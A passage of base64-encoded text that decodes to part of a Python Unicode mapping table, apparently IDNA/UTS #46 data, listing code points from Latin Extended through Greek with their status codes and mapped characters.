GM0XHg4OVwnKSxcbiAgICAoMHgxMDksIFwnVlwnKSxcbiAgICAoMHgxMEEsIFwnTVwnLCBcJ1x4YzRceDhiXCcpLFxuICAgICgweDEwQiwgXCdWXCcpLFxuICAgICgweDEwQywgXCdNXCcsIFwnXHhjNFx4OGRcJyksXG4gICAgKDB4MTBELCBcJ1ZcJyksXG4gICAgKDB4MTBFLCBcJ01cJywgXCdceGM0XHg4ZlwnKSxcbiAgICAoMHgxMEYsIFwnVlwnKSxcbiAgICAoMHgxMTAsIFwnTVwnLCBcJ1x4YzRceDkxXCcpLFxuICAgICgweDExMSwgXCdWXCcpLFxuICAgICgweDExMiwgXCdNXCcsIFwnXHhjNFx4OTNcJyksXG4gICAgKDB4MTEzLCBcJ1ZcJyksXG4gICAgKDB4MTE0LCBcJ01cJywgXCdceGM0XHg5NVwnKSxcbiAgICAoMHgxMTUsIFwnVlwnKSxcbiAgICAoMHgxMTYsIFwnTVwnLCBcJ1x4YzRceDk3XCcpLFxuICAgICgweDExNywgXCdWXCcpLFxuICAgICgweDExOCwgXCdNXCcsIFwnXHhjNFx4OTlcJyksXG4gICAgKDB4MTE5LCBcJ1ZcJyksXG4gICAgKDB4MTFBLCBcJ01cJywgXCdceGM0XHg5YlwnKSxcbiAgICAoMHgxMUIsIFwnVlwnKSxcbiAgICAoMHgxMUMsIFwnTVwnLCBcJ1x4YzRceDlkXCcpLFxuICAgICgweDExRCwgXCdWXCcpLFxuICAgICgweDExRSwgXCdNXCcsIFwnXHhjNFx4OWZcJyksXG4gICAgKDB4MTFGLCBcJ1ZcJyksXG4gICAgKDB4MTIwLCBcJ01cJywgXCdceGM0XHhhMVwnKSxcbiAgICAoMHgxMjEsIFwnVlwnKSxcbiAgICAoMHgxMjIsIFwnTVwnLCBcJ1x4YzRceGEzXCcpLFxuICAgICgweDEyMywgXCdWXCcpLFxuICAgICgweDEyNCwgXCdNXCcsIFwnXHhjNFx4YTVcJyksXG4gICAgKDB4MTI1LCBcJ1ZcJyksXG4gICAgKDB4MTI2LCBcJ01cJywgXCdceGM0XHhhN1wnKSxcbiAgICAoMHgxMjcsIFwnVlwnKSxcbiAgICAoMHgxMjgsIFwnTVwnLCBcJ1x4YzRceGE5XCcpLFxuICAgICgweDEyOSwgXCdWXCcpLFxuICAgICgweDEyQSwgXCdNXCcsIFwnXHhjNFx4YWJcJyksXG4gICAgKDB4MTJCLCBcJ1ZcJyksXG4gICAgXVxuXG5kZWYgX3NlZ18zKCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHgxMkMsIFwnTVwnLCBcJ1x4YzRceGFkXCcpLFxuICAgICgweDEyRCwgXCdWXCcpLFxuICAgICgweDEyRSwgXCdNXCcsIFwnXHhjNFx4YWZcJyksXG4gICAgKDB4MTJGLCBcJ1ZcJyksXG4gICAgKDB4MTMwLCBcJ01cJywgXCdpXHhjY1x4ODdcJyksXG4gICAgKDB4MTMxLCBcJ1ZcJyksXG4gICAgKDB4MTMyLCBcJ01cJywgXCdpalwnKSxcbiAgICAoMHgxMzQsIFwnTVwnLCBcJ1x4YzRceGI1XCcpLFxuICAgICgweDEzNSwgXCdWXCcpLFxuICAgICgweDEzNiwgXCdNXCcsIFwnXHhjNFx4YjdcJyksXG4gICAgKDB4MTM3LCBcJ1ZcJyksXG4gICAgKDB4MTM5LCBcJ01cJywgXCdceGM0XHhiYVwnKSxcbiAgICAoMHgxM0EsIFwnVlwnKSxcbiAgICAoMHgxM0IsIFwnTVwnLCBcJ1x4YzRceGJjXCcpLFxuICAgICgweDEzQywgXCdWXCcpLFxuICAgICgweDEzRCwgXCdNXCcsIFwnXHhjNFx4YmVcJyksXG4gICAgKDB4MTNFLCBcJ1ZcJyksXG4gICAgKDB4MTNGLCBcJ01cJywgXCdsXHhjMlx4YjdcJyksXG4gICAgKDB4MTQxLCBcJ01cJywgXCdceGM1XHg4MlwnKSxcbiAgICAoMHgxNDIsIFwnVlwnKSxcbiAgICAoMHgxNDMsIFwnTVwnLCBcJ1x4YzVceDg0XCcpLFxuICAgICgweDE0NCwgXCdWXCcpLFxuICAgICgweDE0NSwgXCdNXCcsIFwnXHhjNVx4ODZcJyksXG4gICAgKDB4MTQ2LCBcJ1ZcJyksXG4gICAgKDB4MTQ3LCBcJ01cJywgXCdceGM1XHg4OFwnKSxcbiAgICAoMHgxNDgsIFwnVlwnKSxcbiAgICAoMHgxNDksIFwnTVwnLCBcJ1x4Y2FceGJjblwnKSxcbiAgICAoMHgxNEEsIFwnTVwnLCBcJ1x4YzVceDhiXCcpLFxuICAgICgweDE0QiwgXCdWXCcpLFxuICAgICgweDE0QywgXCdNXCcsIFwnXHhjNVx4OGRcJyksXG4gICAgKDB4MTRELCBcJ1ZcJyksXG4gICAgKDB4MTRFLCBcJ01cJywgXCdceGM1XHg4ZlwnKSxcbiAgICAoMHgxNEYsIFwnVlwnKSxcbiAgICAoMHgxNTAsIFwnTVwnLCBcJ1x4YzVceDkxXCcpLFxuICAgICgweDE1MSwgXCdWXCcpLFxuICAgICgweDE1MiwgXCdNXCcsIFwnXHhjNVx4OTNcJyksXG4gICAgKDB4MTUzLCBcJ1ZcJyksXG4gICAgKDB4MTU0LCBcJ01cJywgXCdceGM1XHg5NVwnKSxcbiAgICAoMHgxNTUsIFwnVlwnKSxcbiAgICAoMHgxNTYsIFwnTVwnLCBcJ1x4YzVceDk3XCcpLFxuICAgICgweDE1NywgXCdWXCcpLFxuICAgICgweDE1OCwgXCdNXCcsIFwnXHhjNVx4OTlcJyksXG4gICAgKDB4MTU5LCBcJ1ZcJyksXG4gICAgKDB4MTVBLCBcJ01cJywgXCdceGM1XHg5YlwnKSxcbiAgICAoMHgxNUIsIFwnVlwnKSxcbiAgICAoMHgxNUMsIFwnTVwnLCBcJ1x4YzVceDlkXCcpLFxuICAgICgweDE1RCwgXCdWXCcpLFxuICAgICgweDE1RSwgXCdNXCcsIFwnXHhjNVx4OWZcJyksXG4gICAgKDB4MTVGLCBcJ1ZcJyksXG4gICAgKDB4MTYwLCBcJ01cJywgXCdceGM1XHhhMVwnKSxcbiAgICAoMHgxNjEsIFwnVlwnKSxcbiAgICAoMHgxNjIsIFwnTVwnLCBcJ1x4YzVceGEzXCcpLFxuICAgICgweDE2MywgXCdWXCcpLFxuICAgICgweDE2NCwgXCdNXCcsIFwnXHhjNVx4YTVcJyksXG4gICAgKDB4MTY1LCBcJ1ZcJyksXG4gICAgKDB4MTY2LCBcJ01cJywgXCdceGM1XHhhN1wnKSxcbiAgICAoMHgxNjcsIFwnVlwnKSxcbiAgICAoMHgxNjgsIFwnTVwnLCBcJ1x4YzVceGE5XCcpLFxuICAgICgweDE2OSwgXCdWXCcpLFxuICAgICgweDE2QSwgXCdNXCcsIFwnXHhjNVx4YWJcJyksXG4gICAgKDB4MTZCLCBcJ1ZcJyksXG4gICAgKDB4MTZDLCBcJ01cJywgXCdceGM1XHhhZFwnKSxcbiAgICAoMHgxNkQsIFwnVlwnKSxcbiAgICAoMHgxNkUsIFwnTVwnLCBcJ1x4YzVceGFmXCcpLFxuICAgICgweDE2RiwgXCdWXCcpLFxuICAgICgweDE3MCwgXCdNXCcsIFwnXHhjNVx4YjFcJyksXG4gICAgKDB4MTcxLCBcJ1ZcJyksXG4gICAgKDB4MTcyLCBcJ01cJywgXCdceGM1XHhiM1wnKSxcbiAgICAoMHgxNzMsIFwnVlwnKSxcbiAgICAoMHgxNzQsIFwnTVwnLCBcJ1x4YzVceGI1XCcpLFxuICAgICgweDE3NSwgXCdWXCcpLFxuICAgICgweDE3NiwgXCdNXCcsIFwnXHhjNVx4YjdcJyksXG4gICAgKDB4MTc3LCBcJ1ZcJyksXG4gICAgKDB4MTc4LCBcJ01cJywgXCdceGMzXHhiZlwnKSxcbiAgICAoMHgxNzksIFwnTVwnLCBcJ1x4YzVceGJhXCcpLFxuICAgICgweDE3QSwgXCdWXCcpLFxuICAgICgweDE3QiwgXCdNXCcsIFwnXHhjNVx4YmNcJyksXG4gICAgKDB4MTdDLCBcJ1ZcJyksXG4gICAgKDB4MTdELCBcJ01cJywgXCdceGM1XHhiZVwnKSxcbiAgICAoMHgxN0UsIFwnVlwnKSxcbiAgICAoMHgxN0YsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MTgwLCBcJ1ZcJyksXG4gICAgKDB4MTgxLCBcJ01cJywgXCdceGM5XHg5M1wnKSxcbiAgICAoMHgxODIsIFwnTVwnLCBcJ1x4YzZceDgzXCcpLFxuICAgICgweDE4MywgXCdWXCcpLFxuICAgICgweDE4NCwgXCdNXCcsIFwnXHhjNlx4ODVcJyksXG4gICAgKDB4MTg1LCBcJ1ZcJyksXG4gICAgKDB4MTg2LCBcJ01cJywgXCdceGM5XHg5NFwnKSxcbiAgICAoMHgxODcsIFwnTVwnLCBcJ1x4YzZceDg4XCcpLFxuICAgICgweDE4OCwgXCdWXCcpLFxuICAgICgweDE4OSwgXCdNXCcsIFwnXHhjOVx4OTZcJyksXG4gICAgKDB4MThBLCBcJ01cJywgXCdceGM5XHg5N1wnKSxcbiAgICAoMHgxOEIsIFwnTVwnLCBcJ1x4YzZceDhjXCcpLFxuICAgICgweDE4QywgXCdWXCcpLFxuICAgICgweDE4RSwgXCdNXCcsIFwnXHhjN1x4OWRcJyksXG4gICAgKDB4MThGLCBcJ01cJywgXCdceGM5XHg5OVwnKSxcbiAgICAoMHgxOTAsIFwnTVwnLCBcJ1x4YzlceDliXCcpLFxuICAgICgweDE5MSwgXCdNXCcsIFwnXHhjNlx4OTJcJyksXG4gICAgKDB4MTkyLCBcJ1ZcJyksXG4gICAgKDB4MTkzLCBcJ01cJywgXCdceGM5XHhhMFwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzQoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDE5NCwgXCdNXCcsIFwnXHhjOVx4YTNcJyksXG4gICAgKDB4MTk1LCBcJ1ZcJyksXG4gICAgKDB4MTk2LCBcJ01cJywgXCdceGM5XHhhOVwnKSxcbiAgICAoMHgxOTcsIFwnTVwnLCBcJ1x4YzlceGE4XCcpLFxuICAgICgweDE5OCwgXCdNXCcsIFwnXHhjNlx4OTlcJyksXG4gICAgKDB4MTk5LCBcJ1ZcJyksXG4gICAgKDB4MTlDLCBcJ01cJywgXCdceGM5XHhhZlwnKSxcbiAgICAoMHgxOUQsIFwnTVwnLCBcJ1x4YzlceGIyXCcpLFxuICAgICgweDE5RSwgXCdWXCcpLFxuICAgICgweDE5RiwgXCdNXCcsIFwnXHhjOVx4YjVcJyksXG4gICAgKDB4MUEwLCBcJ01cJywgXCdceGM2XHhhMVwnKSxcbiAgICAoMHgxQTEsIFwnVlwnKSxcbiAgICAoMHgxQTIsIFwnTVwnLCBcJ1x4YzZceGEzXCcpLFxuICAgICgweDFBMywgXCdWXCcpLFxuICAgICgweDFBNCwgXCdNXCcsIFwnXHhjNlx4YTVcJyksXG4gICAgKDB4MUE1LCBcJ1ZcJyksXG4gICAgKDB4MUE2LCBcJ01cJywgXCdceGNhXHg4MFwnKSxcbiAgICAoMHgxQTcsIFwnTVwnLCBcJ1x4YzZceGE4XCcpLFxuICAgICgweDFBOCwgXCdWXCcpLFxuICAgICgweDFBOSwgXCdNXCcsIFwnXHhjYVx4ODNcJyksXG4gICAgKDB4MUFBLCBcJ1ZcJyksXG4gICAgKDB4MUFDLCBcJ01cJywgXCdceGM2XHhhZFwnKSxcbiAgICAoMHgxQUQsIFwnVlwnKSxcbiAgICAoMHgxQUUsIFwnTVwnLCBcJ1x4Y2FceDg4XCcpLFxuICAgICgweDFBRiwgXCdNXCcsIFwnXHhjNlx4YjBcJyksXG4gICAgKDB4MUIwLCBcJ1ZcJyksXG4gICAgKDB4MUIxLCBcJ01cJywgXCdceGNhXHg4YVwnKSxcbiAgICAoMHgxQjIsIFwnTVwnLCBcJ1x4Y2FceDhiXCcpLFxuICAgICgweDFCMywgXCdNXCcsIFwnXHhjNlx4YjRcJyksXG4gICAgKDB4MUI0LCBcJ1ZcJyksXG4gICAgKDB4MUI1LCBcJ01cJywgXCdceGM2XHhiNlwnKSxcbiAgICAoMHgxQjYsIFwnVlwnKSxcbiAgICAoMHgxQjcsIFwnTVwnLCBcJ1x4Y2FceDkyXCcpLFxuICAgICgweDFCOCwgXCdNXCcsIFwnXHhjNlx4YjlcJyksXG4gICAgKDB4MUI5LCBcJ1ZcJyksXG4gICAgKDB4MUJDLCBcJ01cJywgXCdceGM2XHhiZFwnKSxcbiAgICAoMHgxQkQsIFwnVlwnKSxcbiAgICAoMHgxQzQsIFwnTVwnLCBcJ2RceGM1XHhiZVwnKSxcbiAgICAoMHgxQzcsIFwnTVwnLCBcJ2xqXCcpLFxuICAgICgweDFDQSwgXCdNXCcsIFwnbmpcJyksXG4gICAgKDB4MUNELCBcJ01cJywgXCdceGM3XHg4ZVwnKSxcbiAgICAoMHgxQ0UsIFwnVlwnKSxcbiAgICAoMHgxQ0YsIFwnTVwnLCBcJ1x4YzdceDkwXCcpLFxuICAgICgweDFEMCwgXCdWXCcpLFxuICAgICgweDFEMSwgXCdNXCcsIFwnXHhjN1x4OTJcJyksXG4gICAgKDB4MUQyLCBcJ1ZcJyksXG4gICAgKDB4MUQzLCBcJ01cJywgXCdceGM3XHg5NFwnKSxcbiAgICAoMHgxRDQsIFwnVlwnKSxcbiAgICAoMHgxRDUsIFwnTVwnLCBcJ1x4YzdceDk2XCcpLFxuICAgICgweDFENiwgXCdWXCcpLFxuICAgICgweDFENywgXCdNXCcsIFwnXHhjN1x4OThcJyksXG4gICAgKDB4MUQ4LCBcJ1ZcJyksXG4gICAgKDB4MUQ5LCBcJ01cJywgXCdceGM3XHg5YVwnKSxcbiAgICAoMHgxREEsIFwnVlwnKSxcbiAgICAoMHgxREIsIFwnTVwnLCBcJ1x4YzdceDljXCcpLFxuICAgICgweDFEQywgXCdWXCcpLFxuICAgICgweDFERSwgXCdNXCcsIFwnXHhjN1x4OWZcJyksXG4gICAgKDB4MURGLCBcJ1ZcJyksXG4gICAgKDB4MUUwLCBcJ01cJywgXCdceGM3XHhhMVwnKSxcbiAgICAoMHgxRTEsIFwnVlwnKSxcbiAgICAoMHgxRTIsIFwnTVwnLCBcJ1x4YzdceGEzXCcpLFxuICAgICgweDFFMywgXCdWXCcpLFxuICAgICgweDFFNCwgXCdNXCcsIFwnXHhjN1x4YTVcJyksXG4gICAgKDB4MUU1LCBcJ1ZcJyksXG4gICAgKDB4MUU2LCBcJ01cJywgXCdceGM3XHhhN1wnKSxcbiAgICAoMHgxRTcsIFwnVlwnKSxcbiAgICAoMHgxRTgsIFwnTVwnLCBcJ1x4YzdceGE5XCcpLFxuICAgICgweDFFOSwgXCdWXCcpLFxuICAgICgweDFFQSwgXCdNXCcsIFwnXHhjN1x4YWJcJyksXG4gICAgKDB4MUVCLCBcJ1ZcJyksXG4gICAgKDB4MUVDLCBcJ01cJywgXCdceGM3XHhhZFwnKSxcbiAgICAoMHgxRUQsIFwnVlwnKSxcbiAgICAoMHgxRUUsIFwnTVwnLCBcJ1x4YzdceGFmXCcpLFxuICAgICgweDFFRiwgXCdWXCcpLFxuICAgICgweDFGMSwgXCdNXCcsIFwnZHpcJyksXG4gICAgKDB4MUY0LCBcJ01cJywgXCdceGM3XHhiNVwnKSxcbiAgICAoMHgxRjUsIFwnVlwnKSxcbiAgICAoMHgxRjYsIFwnTVwnLCBcJ1x4YzZceDk1XCcpLFxuICAgICgweDFGNywgXCdNXCcsIFwnXHhjNlx4YmZcJyksXG4gICAgKDB4MUY4LCBcJ01cJywgXCdceGM3XHhiOVwnKSxcbiAgICAoMHgxRjksIFwnVlwnKSxcbiAgICAoMHgxRkEsIFwnTVwnLCBcJ1x4YzdceGJiXCcpLFxuICAgICgweDFGQiwgXCdWXCcpLFxuICAgICgweDFGQywgXCdNXCcsIFwnXHhjN1x4YmRcJyksXG4gICAgKDB4MUZELCBcJ1ZcJyksXG4gICAgKDB4MUZFLCBcJ01cJywgXCdceGM3XHhiZlwnKSxcbiAgICAoMHgxRkYsIFwnVlwnKSxcbiAgICAoMHgyMDAsIFwnTVwnLCBcJ1x4YzhceDgxXCcpLFxuICAgICgweDIwMSwgXCdWXCcpLFxuICAgICgweDIwMiwgXCdNXCcsIFwnXHhjOFx4ODNcJyksXG4gICAgKDB4MjAzLCBcJ1ZcJyksXG4gICAgKDB4MjA0LCBcJ01cJywgXCdceGM4XHg4NVwnKSxcbiAgICAoMHgyMDUsIFwnVlwnKSxcbiAgICAoMHgyMDYsIFwnTVwnLCBcJ1x4YzhceDg3XCcpLFxuICAgICgweDIwNywgXCdWXCcpLFxuICAgICgweDIwOCwgXCdNXCcsIFwnXHhjOFx4ODlcJyksXG4gICAgKDB4MjA5LCBcJ1ZcJyksXG4gICAgKDB4MjBBLCBcJ01cJywgXCdceGM4XHg4YlwnKSxcbiAgICAoMHgyMEIsIFwnVlwnKSxcbiAgICAoMHgyMEMsIFwnTVwnLCBcJ1x4YzhceDhkXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfNSgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4MjBELCBcJ1ZcJyksXG4gICAgKDB4MjBFLCBcJ01cJywgXCdceGM4XHg4ZlwnKSxcbiAgICAoMHgyMEYsIFwnVlwnKSxcbiAgICAoMHgyMTAsIFwnTVwnLCBcJ1x4YzhceDkxXCcpLFxuICAgICgweDIxMSwgXCdWXCcpLFxuICAgICgweDIxMiwgXCdNXCcsIFwnXHhjOFx4OTNcJyksXG4gICAgKDB4MjEzLCBcJ1ZcJyksXG4gICAgKDB4MjE0LCBcJ01cJywgXCdceGM4XHg5NVwnKSxcbiAgICAoMHgyMTUsIFwnVlwnKSxcbiAgICAoMHgyMTYsIFwnTVwnLCBcJ1x4YzhceDk3XCcpLFxuICAgICgweDIxNywgXCdWXCcpLFxuICAgICgweDIxOCwgXCdNXCcsIFwnXHhjOFx4OTlcJyksXG4gICAgKDB4MjE5LCBcJ1ZcJyksXG4gICAgKDB4MjFBLCBcJ01cJywgXCdceGM4XHg5YlwnKSxcbiAgICAoMHgyMUIsIFwnVlwnKSxcbiAgICAoMHgyMUMsIFwnTVwnLCBcJ1x4YzhceDlkXCcpLFxuICAgICgweDIxRCwgXCdWXCcpLFxuICAgICgweDIxRSwgXCdNXCcsIFwnXHhjOFx4OWZcJyksXG4gICAgKDB4MjFGLCBcJ1ZcJyksXG4gICAgKDB4MjIwLCBcJ01cJywgXCdceGM2XHg5ZVwnKSxcbiAgICAoMHgyMjEsIFwnVlwnKSxcbiAgICAoMHgyMjIsIFwnTVwnLCBcJ1x4YzhceGEzXCcpLFxuICAgICgweDIyMywgXCdWXCcpLFxuICAgICgweDIyNCwgXCdNXCcsIFwnXHhjOFx4YTVcJyksXG4gICAgKDB4MjI1LCBcJ1ZcJyksXG4gICAgKDB4MjI2LCBcJ01cJywgXCdceGM4XHhhN1wnKSxcbiAgICAoMHgyMjcsIFwnVlwnKSxcbiAgICAoMHgyMjgsIFwnTVwnLCBcJ1x4YzhceGE5XCcpLFxuICAgICgweDIyOSwgXCdWXCcpLFxuICAgICgweDIyQSwgXCdNXCcsIFwnXHhjOFx4YWJcJyksXG4gICAgKDB4MjJCLCBcJ1ZcJyksXG4gICAgKDB4MjJDLCBcJ01cJywgXCdceGM4XHhhZFwnKSxcbiAgICAoMHgyMkQsIFwnVlwnKSxcbiAgICAoMHgyMkUsIFwnTVwnLCBcJ1x4YzhceGFmXCcpLFxuICAgICgweDIyRiwgXCdWXCcpLFxuICAgICgweDIzMCwgXCdNXCcsIFwnXHhjOFx4YjFcJyksXG4gICAgKDB4MjMxLCBcJ1ZcJyksXG4gICAgKDB4MjMyLCBcJ01cJywgXCdceGM4XHhiM1wnKSxcbiAgICAoMHgyMzMsIFwnVlwnKSxcbiAgICAoMHgyM0EsIFwnTVwnLCBcJ1x4ZTJceGIxXHhhNVwnKSxcbiAgICAoMHgyM0IsIFwnTVwnLCBcJ1x4YzhceGJjXCcpLFxuICAgICgweDIzQywgXCdWXCcpLFxuICAgICgweDIzRCwgXCdNXCcsIFwnXHhjNlx4OWFcJyksXG4gICAgKDB4MjNFLCBcJ01cJywgXCdceGUyXHhiMVx4YTZcJyksXG4gICAgKDB4MjNGLCBcJ1ZcJyksXG4gICAgKDB4MjQxLCBcJ01cJywgXCdceGM5XHg4MlwnKSxcbiAgICAoMHgyNDIsIFwnVlwnKSxcbiAgICAoMHgyNDMsIFwnTVwnLCBcJ1x4YzZceDgwXCcpLFxuICAgICgweDI0NCwgXCdNXCcsIFwnXHhjYVx4ODlcJyksXG4gICAgKDB4MjQ1LCBcJ01cJywgXCdceGNhXHg4Y1wnKSxcbiAgICAoMHgyNDYsIFwnTVwnLCBcJ1x4YzlceDg3XCcpLFxuICAgICgweDI0NywgXCdWXCcpLFxuICAgICgweDI0OCwgXCdNXCcsIFwnXHhjOVx4ODlcJyksXG4gICAgKDB4MjQ5LCBcJ1ZcJyksXG4gICAgKDB4MjRBLCBcJ01cJywgXCdceGM5XHg4YlwnKSxcbiAgICAoMHgyNEIsIFwnVlwnKSxcbiAgICAoMHgyNEMsIFwnTVwnLCBcJ1x4YzlceDhkXCcpLFxuICAgICgweDI0RCwgXCdWXCcpLFxuICAgICgweDI0RSwgXCdNXCcsIFwnXHhjOVx4OGZcJyksXG4gICAgKDB4MjRGLCBcJ1ZcJyksXG4gICAgKDB4MkIwLCBcJ01cJywgXCdoXCcpLFxuICAgICgweDJCMSwgXCdNXCcsIFwnXHhjOVx4YTZcJyksXG4gICAgKDB4MkIyLCBcJ01cJywgXCdqXCcpLFxuICAgICgweDJCMywgXCdNXCcsIFwnclwnKSxcbiAgICAoMHgyQjQsIFwnTVwnLCBcJ1x4YzlceGI5XCcpLFxuICAgICgweDJCNSwgXCdNXCcsIFwnXHhjOVx4YmJcJyksXG4gICAgKDB4MkI2LCBcJ01cJywgXCdceGNhXHg4MVwnKSxcbiAgICAoMHgyQjcsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MkI4LCBcJ01cJywgXCd5XCcpLFxuICAgICgweDJCOSwgXCdWXCcpLFxuICAgICgweDJEOCwgXCczXCcsIFwnIFx4Y2NceDg2XCcpLFxuICAgICgweDJEOSwgXCczXCcsIFwnIFx4Y2NceDg3XCcpLFxuICAgICgweDJEQSwgXCczXCcsIFwnIFx4Y2NceDhhXCcpLFxuICAgICgweDJEQiwgXCczXCcsIFwnIFx4Y2NceGE4XCcpLFxuICAgICgweDJEQywgXCczXCcsIFwnIFx4Y2NceDgzXCcpLFxuICAgICgweDJERCwgXCczXCcsIFwnIFx4Y2NceDhiXCcpLFxuICAgICgweDJERSwgXCdWXCcpLFxuICAgICgweDJFMCwgXCdNXCcsIFwnXHhjOVx4YTNcJyksXG4gICAgKDB4MkUxLCBcJ01cJywgXCdsXCcpLFxuICAgICgweDJFMiwgXCdNXCcsIFwnc1wnKSxcbiAgICAoMHgyRTMsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MkU0LCBcJ01cJywgXCdceGNhXHg5NVwnKSxcbiAgICAoMHgyRTUsIFwnVlwnKSxcbiAgICAoMHgzNDAsIFwnTVwnLCBcJ1x4Y2NceDgwXCcpLFxuICAgICgweDM0MSwgXCdNXCcsIFwnXHhjY1x4ODFcJyksXG4gICAgKDB4MzQyLCBcJ1ZcJyksXG4gICAgKDB4MzQzLCBcJ01cJywgXCdceGNjXHg5M1wnKSxcbiAgICAoMHgzNDQsIFwnTVwnLCBcJ1x4Y2NceDg4XHhjY1x4ODFcJyksXG4gICAgKDB4MzQ1LCBcJ01cJywgXCdceGNlXHhiOVwnKSxcbiAgICAoMHgzNDYsIFwnVlwnKSxcbiAgICAoMHgzNEYsIFwnSVwnKSxcbiAgICAoMHgzNTAsIFwnVlwnKSxcbiAgICAoMHgzNzAsIFwnTVwnLCBcJ1x4Y2RceGIxXCcpLFxuICAgICgweDM3MSwgXCdWXCcpLFxuICAgICgweDM3MiwgXCdNXCcsIFwnXHhjZFx4YjNcJyksXG4gICAgKDB4MzczLCBcJ1ZcJyksXG4gICAgKDB4Mzc0LCBcJ01cJywgXCdceGNhXHhiOVwnKSxcbiAgICAoMHgzNzUsIFwnVlwnKSxcbiAgICAoMHgzNzYsIFwnTVwnLCBcJ1x4Y2RceGI3XCcpLFxuICAgICgweDM3NywgXCdWXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfNigpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4Mzc4LCBcJ1hcJyksXG4gICAgKDB4MzdBLCBcJzNcJywgXCcgXHhjZVx4YjlcJyksXG4gICAgKDB4MzdCLCBcJ1ZcJyksXG4gICAgKDB4MzdFLCBcJzNcJywgXCc7XCcpLFxuICAgICgweDM3RiwgXCdNXCcsIFwnXHhjZlx4YjNcJyksXG4gICAgKDB4MzgwLCBcJ1hcJyksXG4gICAgKDB4Mzg0LCBcJzNcJywgXCcgXHhjY1x4ODFcJyksXG4gICAgKDB4Mzg1LCBcJzNcJywgXCcgXHhjY1x4ODhceGNjXHg4MVwnKSxcbiAgICAoMHgzODYsIFwnTVwnLCBcJ1x4Y2VceGFjXCcpLFxuICAgICgweDM4NywgXCdNXCcsIFwnXHhjMlx4YjdcJyksXG4gICAgKDB4Mzg4LCBcJ01cJywgXCdceGNlXHhhZFwnKSxcbiAgICAoMHgzODksIFwnTVwnLCBcJ1x4Y2VceGFlXCcpLFxuICAgICgweDM4QSwgXCdNXCcsIFwnXHhjZVx4YWZcJyksXG4gICAgKDB4MzhCLCBcJ1hcJyksXG4gICAgKDB4MzhDLCBcJ01cJywgXCdceGNmXHg4Y1wnKSxcbiAgICAoMHgzOEQsIFwnWFwnKSxcbiAgICAoMHgzOEUsIFwnTVwnLCBcJ1x4Y2ZceDhkXCcpLFxuICAgICgweDM4RiwgXCdNXCcsIFwnXHhjZlx4OGVcJyksXG4gICAgKDB4MzkwLCBcJ1ZcJyksXG4gICAgKDB4MzkxLCBcJ01cJywgXCdceGNlXHhiMVwnKSxcbiAgICAoMHgzOTIsIFwnTVwnLCBcJ1x4Y2VceGIyXCcpLFxuICAgICgweDM5MywgXCdNXCcsIFwnXHhjZVx4YjNcJyksXG4gICAgKDB4Mzk0LCBcJ01cJywgXCdceGNlXHhiNFwnKSxcbiAgICAoMHgzOTUsIFwnTVwnLCBcJ1x4Y2VceGI1XCcpLFxuICAgICgweDM5NiwgXCdNXCcsIFwnXHhjZVx4YjZcJyksXG4gICAgKDB4Mzk3LCBcJ01cJywgXCdceGNlXHhiN1wnKSxcbiAgICAoMHgzOTgsIFwnTVwnLCBcJ1x4Y2VceGI4XCcpLFxuICAgICgweDM5OSwgXCdNXCcsIFwnXHhjZVx4YjlcJyksXG4gICAgKDB4MzlBLCBcJ01cJywgXCdceGNlXHhiYVwnKSxcbiAgICAoMHgzOUIsIFwnTVwnLCBcJ1x4Y2VceGJiXCcpLFxuICAgICgweDM5QywgXCdNXCcsIFwnXHhjZVx4YmNcJyksXG4gICAgKDB4MzlELCBcJ01cJywgXCdceGNlXHhiZFwnKSxcbiAgICAoMHgzOUUsIFwnTVwnLCBcJ1x4Y2VceGJlXCcpLFxuICAgICgweDM5RiwgXCdNXCcsIFwnXHhjZVx4YmZcJyksXG4gICAgKDB4M0EwLCBcJ01cJywgXCdceGNmXHg4MFwnKSxcbiAgICAoMHgzQTEsIFwnTVwnLCBcJ1x4Y2ZceDgxXCcpLFxuICAgICgweDNBMiwgXCdYXCcpLFxuICAgICgweDNBMywgXCdNXCcsIFwnXHhjZlx4ODNcJyksXG4gICAgKDB4M0E0LCBcJ01cJywgXCdceGNmXHg4NFwnKSxcbiAgICAoMHgzQTUsIFwnTVwnLCBcJ1x4Y2ZceDg1XCcpLFxuICAgICgweDNBNiwgXCdNXCcsIFwnXHhjZlx4ODZcJyksXG4gICAgKDB4M0E3LCBcJ01cJywgXCdceGNmXHg4N1wnKSxcbiAgICAoMHgzQTgsIFwnTVwnLCBcJ1x4Y2ZceDg4XCcpLFxuICAgICgweDNBOSwgXCdNXCcsIFwnXHhjZlx4ODlcJyksXG4gICAgKDB4M0FBLCBcJ01cJywgXCdceGNmXHg4YVwnKSxcbiAgICAoMHgzQUIsIFwnTVwnLCBcJ1x4Y2ZceDhiXCcpLFxuICAgICgweDNBQywgXCdWXCcpLFxuICAgICgweDNDMiwgXCdEXCcsIFwnXHhjZlx4ODNcJyksXG4gICAgKDB4M0MzLCBcJ1ZcJyksXG4gICAgKDB4M0NGLCBcJ01cJywgXCdceGNmXHg5N1wnKSxcbiAgICAoMHgzRDAsIFwnTVwnLCBcJ1x4Y2VceGIyXCcpLFxuICAgICgweDNEMSwgXCdNXCcsIFwnXHhjZVx4YjhcJyksXG4gICAgKDB4M0QyLCBcJ01cJywgXCdceGNmXHg4NVwnKSxcbiAgICAoMHgzRDMsIFwnTVwnLCBcJ1x4Y2ZceDhkXCcpLFxuICAgICgweDNENCwgXCdNXCcsIFwnXHhjZlx4OGJcJyksXG4gICAgKDB4M0Q1LCBcJ01cJywgXCdceGNmXHg4NlwnKSxcbiAgICAoMHgzRDYsIFwnTVwnLCBcJ1x4Y2Z